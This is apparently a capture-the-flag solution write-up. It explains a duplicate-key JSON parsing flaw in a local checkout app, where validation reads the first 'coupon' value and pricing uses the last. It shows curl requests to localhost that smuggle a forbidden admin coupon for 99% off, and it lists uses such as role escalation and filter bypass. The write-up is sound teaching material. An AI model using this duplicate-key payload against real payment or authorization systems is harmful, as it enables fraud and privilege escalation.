# Solution

## The Bug

This challenge demonstrates **inconsistent JSON parsing** vulnerability

When JSON contains duplicate keys, different parsers handle them differently:
- Some take the first value
- Some take the last value
- Some reject it entirely

In this code, the validation checks the first occurrence of the coupon key, but the discount calculation uses the last occurrence. This mismatch creates a bypass.

## Discovery

First, try the obvious approach:

```bash
curl -X POST http://localhost:5000/checkout \
  -H "Content-Type: application/json" \
  -d '{"item": "trophy", "coupon": "ADMIN99"}'
```

Result: `{"error": "Admin coupon not allowed"}`

The security check is working. But what if we can trick it?

## The Exploit

Send the coupon key twice with different values:

```bash
curl -X POST http://localhost:5000/checkout \
  -H "Content-Type: application/json" \
  -d '{"item": "trophy", "coupon": "SAVE10", "coupon": "ADMIN99"}'
```

**Result:**
```json
{
  "discount": "99%",
  "final_price": 10.0,
  "success": "Congratulations! Bravo",
  "item": "trophy",
  "original_price": 1000
}
```

Success! The trophy costs $10, well under the $50 budget.

## Why This Works

Looking at the vulnerable code:

```python
# Line 64: Validation checks FIRST occurrence
first_coupon = get_first_value(raw_data, 'coupon')
if first_coupon == 'ADMIN99':
    return error

# Line 70: Discount uses LAST occurrence (from parsed dict)
discount = COUPONS.get(coupon_from_dict, 0)
```

When we send: `{"coupon": "SAVE10", "coupon": "ADMIN99"}`

1. The raw string parser finds `"SAVE10"` first
2. Validation checks: Is "SAVE10" == "ADMIN99"? No → Passes ✓
3. Python's JSON parser keeps the last value: "ADMIN99"
4. Discount calculation: Uses "ADMIN99" → 99% off!

The application uses two different parsing strategies on the same input, creating a security gap.

## Real-World Impact

Real applications have been vulnerable to this:

- **Payment bypasses**: Apply premium discounts while passing basic validation
- **Privilege escalation**: Set `role: user` for validation, `role: admin` for authorization
- **Rate limiting**: Different services count requests differently
- **Filter bypasses**: WAF sees safe values, application sees malicious ones

This happens when:
- JSON passes through multiple services (microservices, API gateways)
- Validation happens in one language, processing in another
- Custom parsers coexist with standard libraries
